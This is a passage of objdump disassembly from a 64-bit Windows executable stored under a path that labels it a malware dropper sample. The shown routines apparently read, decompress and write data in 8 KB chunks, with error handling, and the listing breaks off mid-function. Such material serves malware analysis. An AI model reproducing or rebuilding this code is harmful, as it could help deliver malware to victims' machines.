
malware_samples/dropper/690459835383c4eb733c2817d8f9add7417312f7938e150e2429d0b5e2b4b2d0.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	e8 2f e1 00 00       	call   0x14000f138
   140001009:	8b 08                	mov    (%rax),%ecx
   14000100b:	48 8b 05 ee cf 03 00 	mov    0x3cfee(%rip),%rax        # 0x14003e000
   140001012:	89 08                	mov    %ecx,(%rax)
   140001014:	e8 27 e1 00 00       	call   0x14000f140
   140001019:	48 8b 08             	mov    (%rax),%rcx
   14000101c:	48 8b 05 dd cf 03 00 	mov    0x3cfdd(%rip),%rax        # 0x14003e000
   140001023:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140001027:	48 8b 0d d2 cf 03 00 	mov    0x3cfd2(%rip),%rcx        # 0x14003e000
   14000102e:	48 83 c4 28          	add    $0x28,%rsp
   140001032:	e9 b9 24 00 00       	jmp    0x1400034f0
   140001037:	cc                   	int3
   140001038:	cc                   	int3
   140001039:	cc                   	int3
   14000103a:	cc                   	int3
   14000103b:	cc                   	int3
   14000103c:	cc                   	int3
   14000103d:	cc                   	int3
   14000103e:	cc                   	int3
   14000103f:	cc                   	int3
   140001040:	48 8d 05 71 43 04 00 	lea    0x44371(%rip),%rax        # 0x1400453b8
   140001047:	c3                   	ret
   140001048:	cc                   	int3
   140001049:	cc                   	int3
   14000104a:	cc                   	int3
   14000104b:	cc                   	int3
   14000104c:	cc                   	int3
   14000104d:	cc                   	int3
   14000104e:	cc                   	int3
   14000104f:	cc                   	int3
   140001050:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001055:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000105a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000105f:	56                   	push   %rsi
   140001060:	57                   	push   %rdi
   140001061:	41 54                	push   %r12
   140001063:	41 55                	push   %r13
   140001065:	41 57                	push   %r15
   140001067:	48 83 ec 20          	sub    $0x20,%rsp
   14000106b:	48 8b f2             	mov    %rdx,%rsi
   14000106e:	33 ed                	xor    %ebp,%ebp
   140001070:	48 8d 15 fd a7 02 00 	lea    0x2a7fd(%rip),%rdx        # 0x14002b874
   140001077:	44 8b fd             	mov    %ebp,%r15d
   14000107a:	49 8b f8             	mov    %r8,%rdi
   14000107d:	48 8b d9             	mov    %rcx,%rbx
   140001080:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
   140001086:	e8 e5 2e 00 00       	call   0x140003f70
   14000108b:	4c 8b e0             	mov    %rax,%r12
   14000108e:	48 85 c0             	test   %rax,%rax
   140001091:	75 15                	jne    0x1400010a8
   140001093:	48 8d 56 12          	lea    0x12(%rsi),%rdx
   140001097:	48 8d 0d da a7 02 00 	lea    0x2a7da(%rip),%rcx        # 0x14002b878
   14000109e:	e8 4d 15 00 00       	call   0x1400025f0
   1400010a3:	e9 02 01 00 00       	jmp    0x1400011aa
   1400010a8:	8b 56 04             	mov    0x4(%rsi),%edx
   1400010ab:	45 33 c0             	xor    %r8d,%r8d
   1400010ae:	48 03 93 00 10 00 00 	add    0x1000(%rbx),%rdx
   1400010b5:	49 8b cc             	mov    %r12,%rcx
   1400010b8:	e8 37 e9 00 00       	call   0x14000f9f4
   1400010bd:	85 c0                	test   %eax,%eax
   1400010bf:	79 1c                	jns    0x1400010dd
   1400010c1:	4c 8d 46 12          	lea    0x12(%rsi),%r8
   1400010c5:	48 8d 15 e4 a7 02 00 	lea    0x2a7e4(%rip),%rdx        # 0x14002b8b0
   1400010cc:	48 8d 0d 19 a8 02 00 	lea    0x2a819(%rip),%rcx        # 0x14002b8ec
   1400010d3:	e8 88 16 00 00       	call   0x140002760
   1400010d8:	e9 af 00 00 00       	jmp    0x14000118c
   1400010dd:	8b 4e 0c             	mov    0xc(%rsi),%ecx
   1400010e0:	e8 8b 30 01 00       	call   0x140014170
   1400010e5:	4c 8b f8             	mov    %rax,%r15
   1400010e8:	48 85 c0             	test   %rax,%rax
   1400010eb:	75 20                	jne    0x14000110d
   1400010ed:	44 8b 4e 0c          	mov    0xc(%rsi),%r9d
   1400010f1:	4c 8d 46 12          	lea    0x12(%rsi),%r8
   1400010f5:	48 8d 15 04 a8 02 00 	lea    0x2a804(%rip),%rdx        # 0x14002b900
   1400010fc:	48 8d 0d 11 a6 02 00 	lea    0x2a611(%rip),%rcx        # 0x14002b714
   140001103:	e8 58 16 00 00       	call   0x140002760
   140001108:	e9 7f 00 00 00       	jmp    0x14000118c
   14000110d:	80 7e 10 01          	cmpb   $0x1,0x10(%rsi)
   140001111:	75 13                	jne    0x140001126
   140001113:	4d 8b cf             	mov    %r15,%r9
   140001116:	45 33 c0             	xor    %r8d,%r8d
   140001119:	48 8b d6             	mov    %rsi,%rdx
   14000111c:	49 8b cc             	mov    %r12,%rcx
   14000111f:	e8 cc 00 00 00       	call   0x1400011f0
   140001124:	eb 57                	jmp    0x14000117d
   140001126:	8b 5e 0c             	mov    0xc(%rsi),%ebx
   140001129:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   14000112e:	4d 8b f7             	mov    %r15,%r14
   140001131:	48 85 db             	test   %rbx,%rbx
   140001134:	74 3b                	je     0x140001171
   140001136:	b8 00 20 00 00       	mov    $0x2000,%eax
   14000113b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001140:	48 3b d8             	cmp    %rax,%rbx
   140001143:	48 8b fb             	mov    %rbx,%rdi
   140001146:	4d 8b cc             	mov    %r12,%r9
   140001149:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000114f:	48 0f 47 f8          	cmova  %rax,%rdi
   140001153:	49 8b ce             	mov    %r14,%rcx
   140001156:	48 8b d7             	mov    %rdi,%rdx
   140001159:	e8 5e e5 00 00       	call   0x14000f6bc
   14000115e:	48 83 f8 01          	cmp    $0x1,%rax
   140001162:	72 68                	jb     0x1400011cc
   140001164:	4c 03 f7             	add    %rdi,%r14
   140001167:	b8 00 20 00 00       	mov    $0x2000,%eax
   14000116c:	48 2b df             	sub    %rdi,%rbx
   14000116f:	75 cf                	jne    0x140001140
   140001171:	8b c5                	mov    %ebp,%eax
   140001173:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140001178:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   14000117d:	85 c0                	test   %eax,%eax
   14000117f:	74 0b                	je     0x14000118c
   140001181:	49 8b cf             	mov    %r15,%rcx
   140001184:	e8 d3 2f 01 00       	call   0x14001415c
   140001189:	4c 8b fd             	mov    %rbp,%r15
   14000118c:	49 8b cc             	mov    %r12,%rcx
   14000118f:	e8 d8 e1 00 00       	call   0x14000f36c
   140001194:	49 8b ef             	mov    %r15,%rbp
   140001197:	4d 85 ff             	test   %r15,%r15
   14000119a:	74 0e                	je     0x1400011aa
   14000119c:	48 8b d7             	mov    %rdi,%rdx
   14000119f:	49 8b cf             	mov    %r15,%rcx
   1400011a2:	e8 f9 2e 00 00       	call   0x1400040a0
   1400011a7:	44 8b e8             	mov    %eax,%r13d
   1400011aa:	48 8b cd             	mov    %rbp,%rcx
   1400011ad:	e8 aa 2f 01 00       	call   0x14001415c
   1400011b2:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1400011b7:	41 8b c5             	mov    %r13d,%eax
   1400011ba:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   1400011bf:	48 83 c4 20          	add    $0x20,%rsp
   1400011c3:	41 5f                	pop    %r15
   1400011c5:	41 5d                	pop    %r13
   1400011c7:	41 5c                	pop    %r12
   1400011c9:	5f                   	pop    %rdi
   1400011ca:	5e                   	pop    %rsi
   1400011cb:	c3                   	ret
   1400011cc:	4c 8d 46 12          	lea    0x12(%rsi),%r8
   1400011d0:	48 8d 15 21 a6 02 00 	lea    0x2a621(%rip),%rdx        # 0x14002b7f8
   1400011d7:	48 8d 0d 4e a6 02 00 	lea    0x2a64e(%rip),%rcx        # 0x14002b82c
   1400011de:	e8 7d 15 00 00       	call   0x140002760
   1400011e3:	41 8b c5             	mov    %r13d,%eax
   1400011e6:	eb 8b                	jmp    0x140001173
   1400011e8:	cc                   	int3
   1400011e9:	cc                   	int3
   1400011ea:	cc                   	int3
   1400011eb:	cc                   	int3
   1400011ec:	cc                   	int3
   1400011ed:	cc                   	int3
   1400011ee:	cc                   	int3
   1400011ef:	cc                   	int3
   1400011f0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400011f5:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400011fa:	53                   	push   %rbx
   1400011fb:	55                   	push   %rbp
   1400011fc:	56                   	push   %rsi
   1400011fd:	57                   	push   %rdi
   1400011fe:	41 56                	push   %r14
   140001200:	41 57                	push   %r15
   140001202:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140001209:	33 c0                	xor    %eax,%eax
   14000120b:	4d 8b f0             	mov    %r8,%r14
   14000120e:	48 8b da             	mov    %rdx,%rbx
   140001211:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001216:	48 8b f9             	mov    %rcx,%rdi
   140001219:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000121e:	41 b8 58 00 00 00    	mov    $0x58,%r8d
   140001224:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001229:	48 8d 15 40 a4 02 00 	lea    0x2a440(%rip),%rdx        # 0x14002b670
   140001230:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140001234:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001239:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000123e:	8b e8                	mov    %eax,%ebp
   140001240:	49 8b f1             	mov    %r9,%rsi
   140001243:	e8 58 9e 00 00       	call   0x14000b0a0
   140001248:	44 8b f8             	mov    %eax,%r15d
   14000124b:	85 c0                	test   %eax,%eax
   14000124d:	74 28                	je     0x140001277
   14000124f:	48 8d 53 12          	lea    0x12(%rbx),%rdx
   140001253:	44 8b c0             	mov    %eax,%r8d
   140001256:	48 8d 0d 23 a4 02 00 	lea    0x2a423(%rip),%rcx        # 0x14002b680
   14000125d:	e8 8e 13 00 00       	call   0x1400025f0
   140001262:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001267:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   14000126e:	41 5f                	pop    %r15
   140001270:	41 5e                	pop    %r14
   140001272:	5f                   	pop    %rdi
   140001273:	5e                   	pop    %rsi
   140001274:	5d                   	pop    %rbp
   140001275:	5b                   	pop    %rbx
   140001276:	c3                   	ret
   140001277:	b9 00 20 00 00       	mov    $0x2000,%ecx
   14000127c:	4c 89 ac 24 80 00 00 	mov    %r13,0x80(%rsp)
   140001283:	00 
   140001284:	e8 e7 2e 01 00       	call   0x140014170
   140001289:	4c 8b e8             	mov    %rax,%r13
   14000128c:	48 85 c0             	test   %rax,%rax
   14000128f:	75 1c                	jne    0x1400012ad
   140001291:	4c 8d 43 12          	lea    0x12(%rbx),%r8
   140001295:	48 8d 15 34 a4 02 00 	lea    0x2a434(%rip),%rdx        # 0x14002b6d0
   14000129c:	48 8d 0d 71 a4 02 00 	lea    0x2a471(%rip),%rcx        # 0x14002b714
   1400012a3:	e8 b8 14 00 00       	call   0x140002760
   1400012a8:	e9 5c 01 00 00       	jmp    0x140001409
   1400012ad:	b9 00 20 00 00       	mov    $0x2000,%ecx
   1400012b2:	e8 b9 2e 01 00       	call   0x140014170
   1400012b7:	48 8b e8             	mov    %rax,%rbp
   1400012ba:	48 85 c0             	test   %rax,%rax
   1400012bd:	75 1c                	jne    0x1400012db
   1400012bf:	4c 8d 43 12          	lea    0x12(%rbx),%r8
   1400012c3:	48 8d 15 56 a4 02 00 	lea    0x2a456(%rip),%rdx        # 0x14002b720
   1400012ca:	48 8d 0d 43 a4 02 00 	lea    0x2a443(%rip),%rcx        # 0x14002b714
   1400012d1:	e8 8a 14 00 00       	call   0x140002760
   1400012d6:	e9 2e 01 00 00       	jmp    0x140001409
   1400012db:	4c 89 a4 24 d0 00 00 	mov    %r12,0xd0(%rsp)
   1400012e2:	00 
   1400012e3:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   1400012e9:	44 8b 63 08          	mov    0x8(%rbx),%r12d
   1400012ed:	0f 1f 00             	nopl   (%rax)
   1400012f0:	b8 00 20 00 00       	mov    $0x2000,%eax
   1400012f5:	49 8b dc             	mov    %r12,%rbx
   1400012f8:	4c 3b e0             	cmp    %rax,%r12
   1400012fb:	4c 8b cf             	mov    %rdi,%r9
   1400012fe:	ba 01 00 00 00       	mov    $0x1,%edx
   140001303:	49 8b cd             	mov    %r13,%rcx
   140001306:	48 0f 47 d8          	cmova  %rax,%rbx
   14000130a:	4c 8b c3             	mov    %rbx,%r8
   14000130d:	e8 aa e3 00 00       	call   0x14000f6bc
   140001312:	48 3b c3             	cmp    %rbx,%rax
   140001315:	0f 85 e6 00 00 00    	jne    0x140001401
   14000131b:	48 8b cf             	mov    %rdi,%rcx
   14000131e:	e8 0d e1 00 00       	call   0x14000f430
   140001323:	85 c0                	test   %eax,%eax
   140001325:	0f 85 d6 00 00 00    	jne    0x140001401
   14000132b:	4c 2b e3             	sub    %rbx,%r12
   14000132e:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140001332:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140001337:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000133e:	00 00 
   140001340:	bb 00 20 00 00       	mov    $0x2000,%ebx
   140001345:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   14000134a:	33 d2                	xor    %edx,%edx
   14000134c:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   140001350:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001355:	e8 86 81 00 00       	call   0x1400094e0
   14000135a:	8b f8                	mov    %eax,%edi
   14000135c:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   140001362:	8d 48 04             	lea    0x4(%rax),%ecx
   140001365:	83 f9 02             	cmp    $0x2,%ecx
   140001368:	76 7c                	jbe    0x1400013e6
   14000136a:	83 f8 02             	cmp    $0x2,%eax
   14000136d:	74 72                	je     0x1400013e1
   14000136f:	8b 4c 24 38          	mov    0x38(%rsp),%ecx
   140001373:	48 2b d9             	sub    %rcx,%rbx
   140001376:	4d 85 f6             	test   %r14,%r14
   140001379:	74 29                	je     0x1400013a4
   14000137b:	4d 8b ce             	mov    %r14,%r9
   14000137e:	4c 8b c3             	mov    %rbx,%r8
   140001381:	ba 01 00 00 00       	mov    $0x1,%edx
   140001386:	48 8b cd             	mov    %rbp,%rcx
   140001389:	e8 6e ea 00 00       	call   0x14000fdfc
   14000138e:	48 3b c3             	cmp    %rbx,%rax
   140001391:	75 0c                	jne    0x14000139f
   140001393:	49 8b ce             	mov    %r14,%rcx
   140001396:	e8 95 e0 00 00       	call   0x14000f430
   14000139b:	85 c0                	test   %eax,%eax
   14000139d:	74 1b                	je     0x1400013ba
   14000139f:	41 8b ff             	mov    %r15d,%edi
   1400013a2:	eb 42                	jmp    0x1400013e6
   1400013a4:	48 85 f6             	test   %rsi,%rsi
   1400013a7:	74 11                	je     0x1400013ba
   1400013a9:	4c 8b c3             	mov    %rbx,%r8
   1400013ac:	48 8b d5             	mov    %rbp,%rdx
   1400013af:	48 8b ce             	mov    %rsi,%rcx
   1400013b2:	e8 89 7d 02 00       	call   0x140029140
   1400013b7:	48 03 f3             	add    %rbx,%rsi
   1400013ba:	83 7c 24 38 00       	cmpl   $0x0,0x38(%rsp)
   1400013bf:	0f 84 7b ff ff ff    	je     0x140001340
   1400013c5:	83 ff 01             	cmp    $0x1,%edi
   1400013c8:	74 12                	je     0x1400013dc
   1400013ca:	4d 85 e4             	test   %r12,%r12
   1400013cd:	74 17                	je     0x1400013e6
   1400013cf:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   1400013d6:	00 
   1400013d7:	e9 14 ff ff ff       	jmp    0x1400012f0
   1400013dc:	45 33 ff             	xor    %r15d,%r15d
   1400013df:	eb 20                	jmp    0x140001401
   1400013e1:	bf fd ff ff ff       	mov    $0xfffffffd,%edi
   1400013e6:	48 8b 94 24 c8 00 00 	mov    0xc8(%rsp),%rdx
   1400013ed:	00 
   1400013ee:	48 8d 0d 7b a3 02 00 	lea    0x2a37b(%rip),%rcx        # 0x14002b770
   1400013f5:	48 83 c2 12          	add    $0x12,%rdx
   1400013f9:	44 8b c7             	mov    %edi,%r8d
   1400013fc:	e8 ef 11 00 00       	call   0x1400025f0
   140001401:	4c 8b a4 24 d0 00 00 	mov    0xd0(%rsp),%r12
   140001408:	00 
   140001409:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000140e:	e8 6d 99 00 00       	call   0x14000ad80
   140001413:	49 8b cd             	mov    %r13,%rcx
   140001416:	e8 41 2d 01 00       	call   0x14001415c
   14000141b:	48 8b cd             	mov    %rbp,%rcx
   14000141e:	e8 39 2d 01 00       	call   0x14001415c
   140001423:	4c 8b ac 24 80 00 00 	mov    0x80(%rsp),%r13
   14000142a:	00 
   14000142b:	41 8b c7             	mov    %r15d,%eax
   14000142e:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140001435:	41 5f                	pop    %r15
   140001437:	41 5e                	pop    %r14
   140001439:	5f                   	pop    %rdi
   14000143a:	5e                   	pop    %rsi
   14000143b:	5d                   	pop    %rbp
   14000143c:	5b                   	pop    %rbx
   14000143d:	c3                   	ret
   14000143e:	cc                   	int3
   14000143f:	cc                   	int3
   140001440:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001445:	56                   	push   %rsi
   140001446:	41 56                	push   %r14
   140001448:	41 57                	push   %r15
   14000144a:	48 83 ec 20          	sub    $0x20,%rsp
   14000144e:	48 8b f2             	mov    %rdx,%rsi
   140001451:	48 8b d9             	mov    %rcx,%rbx
   140001454:	48 8d 15 19 a4 02 00 	lea    0x2a419(%rip),%rdx        # 0x14002b874
   14000145b:	45 33 f6             	xor    %r14d,%r14d
   14000145e:	e8 0d 2b 00 00       	call   0x140003f70
   140001463:	4c 8b f8             	mov    %rax,%r15
   140001466:	48 85 c0             	test   %rax,%rax
   140001469:	75 21                	jne    0x14000148c
   14000146b:	48 8d 56 12          	lea    0x12(%rsi),%rdx
   14000146f:	48 8d 0d 02 a4 02 00 	lea    0x2a402(%rip),%rcx        # 0x14002b878
   140001476:	e8 75 11 00 00       	call   0x1400025f0
   14000147b:	33 c0                	xor    %eax,%eax
   14000147d:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140001482:	48 83 c4 20          	add    $0x20,%rsp
   140001486:	41 5f                	pop    %r15
   140001488:	41 5e                	pop    %r14
   14000148a:	5e                   	pop    %rsi
   14000148b:	c3                   	ret
   14000148c:	8b 56 04             	mov    0x4(%rsi),%edx
   14000148f:	45 33 c0             	xor    %r8d,%r8d
   140001492:	48 03 93 00 10 00 00 	add    0x1000(%rbx),%rdx
   140001499:	49 8b cf             	mov    %r15,%rcx
   14000149c:	e8 53 e5 00 00       	call   0x14000f9f4
   1400014a1:	85 c0                	test   %eax,%eax
   1400014a3:	79 1c                	jns    0x1400014c1
   1400014a5:	4c 8d 46 12          	lea    0x12(%rsi),%r8
   1400014a9:	48 8d 15 00 a4 02 00 	lea    0x2a400(%rip),%rdx        # 0x14002b8b0
   1400014b0:	48 8d 0d 35 a4 02 00 	lea    0x2a435(%rip),%rcx        # 0x14002b8ec
   1400014b7:	e8 a4 12 00 00       	call   0x140002760
   1400014bc:	e9 bb 00 00 00       	jmp    0x14000157c
   1400014c1:	8b 4e 0c             	mov    0xc(%rsi),%ecx
   1400014c4:	e8 a7 2c 01 00       	call   0x140014170
   1400014c9:	4c 8b f0             	mov    %rax,%r14
   1400014cc:	48 85 c0             	test   %rax,%rax
   1400014cf:	75 20                	jne    0x1400014f1
   1400014d1:	44 8b 4e 0c          	mov    0xc(%rsi),%r9d
   1400014d5:	4c 8d 46 12          	lea    0x12(%rsi),%r8
   1400014d9:	48 8d 15 20 a4 02 00 	lea    0x2a420(%rip),%rdx        # 0x14002b900
   1400014e0:	48 8d 0d 2d a2 02 00 	lea    0x2a22d(%rip),%rcx        # 0x14002b714
   1400014e7:	e8 74 12 00 00       	call   0x140002760
   1400014ec:	e9 8b 00 00 00       	jmp    0x14000157c
   1400014f1:	80 7e 10 01          	cmpb   $0x1,0x10(%rsi)
   1400014f5:	75 13                	jne    0x14000150a
   1400014f7:	4d 8b ce             	mov    %r14,%r9
   1400014fa:	45 33 c0             	xor    %r8d,%r8d
   1400014fd:	48 8b d6             	mov    %rsi,%rdx
   140001500:	49 8b cf             	mov    %r15,%rcx
   140001503:	e8 e8 fc ff ff       	call   0x1400011f0
   140001508:	eb 63                	jmp    0x14000156d
   14000150a:	8b 5e 0c             	mov    0xc(%rsi),%ebx
   14000150d:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140001512:	49 8b ee             	mov    %r14,%rbp
   140001515:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   14000151a:	4c 89 64 24 50       	mov    %r12,0x50(%rsp)
   14000151f:	48 85 db             	test   %rbx,%rbx
   140001522:	74 38                	je     0x14000155c
   140001524:	41 bc 00 20 00 00    	mov    $0x2000,%r12d
   14000152a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001530:	49 3b dc             	cmp    %r12,%rbx
   140001533:	48 8b fb             	mov    %rbx,%rdi
   140001536:	4d 8b cf             	mov    %r15,%r9
   140001539:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000153f:	49 0f 47 fc          	cmova  %r12,%rdi
   140001543:	48 8b cd             	mov    %rbp,%rcx
   140001546:	48 8b d7             	mov    %rdi,%rdx
   140001549:	e8 6e e1 00 00       	call   0x14000f6bc
   14000154e:	48 83 f8 01          	cmp    $0x1,%rax
   140001552:	72 42                	jb     0x140001596
   140001554:	48 03 ef             	add    %rdi,%rbp
   140001557:	48 2b df             	sub    %rdi,%rbx
   14000155a:	75 d4                	jne    0x140001530
   14000155c:	33 c0                	xor    %eax,%eax
   14000155e:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140001563:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140001568:	4c 8b 64 24 50       	mov    0x50(%rsp),%r12
   14000156d:	85 c0                	test   %eax,%eax
   14000156f:	74 0b                	je     0x14000157c
   140001571:	49 8b ce             	mov    %r14,%rcx
   140001574:	e8 e3 2b 01 00       	call   0x14001415c
   140001579:	45 33 f6             	xor    %r14d,%r14d
   14000157c:	49 8b cf             	mov    %r15,%rcx
   14000157f:	e8 e8 dd 00 00       	call   0x14000f36c
   140001584:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140001589:	49 8b c6             	mov    %r14,%rax
   14000158c:	48 83 c4 20          	add    $0x20,%rsp
   140001590:	41 5f                	pop    %r15
   140001592:	41 5e                	pop    %r14
   140001594:	5e                   	pop    %rsi
   140001595:	c3                   	ret
   140001596:	4c 8d 46 12          	lea    0x12(%rsi),%r8
   14000159a:	48 8d 15 57 a2 02 00 	lea    0x2a257(%rip),%rdx        # 0x14002b7f8
   1400015a1:	48 8d 0d 84 a2 02 00 	lea    0x2a284(%rip),%rcx        # 0x14002b82c
   1400015a8:	e8 b3 11 00 00       	call   0x140002760
   1400015ad:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400015b2:	eb aa                	jmp    0x14000155e
   1400015b4:	cc                   	int3
   1400015b5:	cc                   	int3
   1400015b6:	cc                   	int3
   1400015b7:	cc                   	int3
   1400015b8:	cc                   	int3
   1400015b9:	cc                   	int3
   1400015ba:	cc                   	int3
   1400015bb:	cc                   	int3
   1400015bc:	cc                   	int3
   1400015bd:	cc                   	int3
   1400015be:	cc                   	int3
   1400015bf:	cc                   	int3
   1400015c0:	40 53                	rex push %rbx
   1400015c2:	57                   	push   %rdi
   1400015c3:	48 83 ec 38          	sub    $0x38,%rsp
   1400015c7:	80 7a 11 6e          	cmpb   $0x6e,0x11(%rdx)
   1400015cb:	48 8b fa             	mov    %rdx,%rdi
   1400015ce:	48 8b d9             	mov    %rcx,%rbx
   1400015d1:	75 24                	jne    0x1400015f7
   1400015d3:	e8 78 fa ff ff       	call   0x140001050
   1400015d8:	8b d8                	mov    %eax,%ebx
   1400015da:	85 c0                	test   %eax,%eax
   1400015dc:	79 10                	jns    0x1400015ee
   1400015de:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   1400015e2:	48 8d 0d 5f a3 02 00 	lea    0x2a35f(%rip),%rcx        # 0x14002b948
   1400015e9:	e8 02 10 00 00       	call   0x1400025f0
   1400015ee:	8b c3                	mov    %ebx,%eax
   1400015f0:	48 83 c4 38          	add    $0x38,%rsp
   1400015f4:	5f                   	pop    %rdi
   1400015f5:	5b                   	pop    %rbx
   1400015f6:	c3                   	ret
   1400015f7:	48 8d 15 6e a3 02 00 	lea    0x2a36e(%rip),%rdx        # 0x14002b96c
   1400015fe:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   140001603:	49 8b c8             	mov    %r8,%rcx
   140001606:	e8 65 29 00 00       	call   0x140003f70
   14000160b:	4c 8b e0             	mov    %rax,%r12
   14000160e:	48 85 c0             	test   %rax,%rax
   140001611:	75 28                	jne    0x14000163b
   140001613:	4c 8d 47 12          	lea    0x12(%rdi),%r8
   140001617:	48 8d 15 52 a3 02 00 	lea    0x2a352(%rip),%rdx        # 0x14002b970
   14000161e:	48 8d 0d 7f a3 02 00 	lea    0x2a37f(%rip),%rcx        # 0x14002b9a4
   140001625:	e8 36 11 00 00       	call   0x140002760
   14000162a:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   14000162f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001634:	48 83 c4 38          	add    $0x38,%rsp
   140001638:	5f                   	pop    %rdi
   140001639:	5b                   	pop    %rbx
   14000163a:	c3                   	ret
   14000163b:	48 8d 15 32 a2 02 00 	lea    0x2a232(%rip),%rdx        # 0x14002b874
   140001642:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140001647:	48 8b cb             	mov    %rbx,%rcx
   14000164a:	e8 21 29 00 00       	call   0x140003f70
   14000164f:	4c 8b f8             	mov    %rax,%r15
   140001652:	48 85 c0             	test   %rax,%rax
   140001655:	75 1a                	jne    0x140001671
   140001657:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   14000165b:	48 8d 0d 16 a2 02 00 	lea    0x2a216(%rip),%rcx        # 0x14002b878
   140001662:	e8 89 0f 00 00       	call   0x1400025f0
   140001667:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   14000166c:	e9 54 01 00 00       	jmp    0x1400017c5
   140001671:	8b 57 04             	mov    0x4(%rdi),%edx
   140001674:	45 33 c0             	xor    %r8d,%r8d
   140001677:	48 03 93 00 10 00 00 	add    0x1000(%rbx),%rdx
   14000167e:	49 8b cf             	mov    %r15,%rcx
   140001681:	e8 6e e3 00 00       	call   0x14000f9f4
   140001686:	85 c0                	test   %eax,%eax
   140001688:	79 21                	jns    0x1400016ab
   14000168a:	4c 8d 47 12          	lea    0x12(%rdi),%r8
   14000168e:	48 8d 15 1b a2 02 00 	lea    0x2a21b(%rip),%rdx        # 0x14002b8b0
   140001695:	48 8d 0d 50 a2 02 00 	lea    0x2a250(%rip),%rcx        # 0x14002b8ec
   14000169c:	e8 bf 10 00 00       	call   0x140002760
   1400016a1:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400016a6:	e9 12 01 00 00       	jmp    0x1400017bd
   1400016ab:	80 7f 10 01          	cmpb   $0x1,0x10(%rdi)
   1400016af:	75 18                	jne    0x1400016c9
   1400016b1:	45 33 c9             	xor    %r9d,%r9d
   1400016b4:	4d 8b c4             	mov    %r12,%r8
   1400016b7:	48 8b d7             	mov    %rdi,%rdx
   1400016ba:	49 8b cf             	mov    %r15,%rcx
   1400016bd:	e8 2e fb ff ff       	call   0x1400011f0
   1400016c2:	8b d8                	mov    %eax,%ebx
   1400016c4:	e9 f4 00 00 00       	jmp    0x1400017bd
   1400016c9:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   1400016ce:	33 db                	xor    %ebx,%ebx
   1400016d0:	41 bd 00 20 00 00    	mov    $0x2000,%r13d
   1400016d6:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400016db:	41 8b cd             	mov    %r13d,%ecx
   1400016de:	e8 8d 2a 01 00       	call   0x140014170
   1400016e3:	4c 8b f0             	mov    %rax,%r14
   1400016e6:	48 85 c0             	test   %rax,%rax
   1400016e9:	75 21                	jne    0x14000170c
   1400016eb:	4c 8d 47 12          	lea    0x12(%rdi),%r8
   1400016ef:	48 8d 15 c2 a0 02 00 	lea    0x2a0c2(%rip),%rdx        # 0x14002b7b8
   1400016f6:	48 8d 0d 17 a0 02 00 	lea    0x2a017(%rip),%rcx        # 0x14002b714
   1400016fd:	e8 5e 10 00 00       	call   0x140002760
   140001702:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140001707:	e9 a7 00 00 00       	jmp    0x1400017b3
   14000170c:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140001711:	8b 77 0c             	mov    0xc(%rdi),%esi
   140001714:	48 85 f6             	test   %rsi,%rsi
   140001717:	0f 84 89 00 00 00    	je     0x1400017a6
   14000171d:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140001722:	0f 1f 40 00          	nopl   0x0(%rax)
   140001726:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000172d:	00 00 00 
